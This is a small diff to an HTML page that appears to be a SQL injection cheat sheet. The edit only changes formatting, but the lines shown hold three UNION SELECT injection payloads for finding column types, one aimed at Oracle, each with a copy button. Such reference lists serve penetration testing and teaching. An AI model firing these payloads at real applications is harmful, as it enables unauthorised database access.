@@ -87,12 +87,12 @@ conditions are used.
 	
 2. get field type
 	
-<b>C1: </b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
+<p>C1: </p><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
 <b>C2: </b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
 <b>C3: </b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 
 <button class="button_conf button_set" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT05')">.C3.</button>
-
+<br>
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
 	
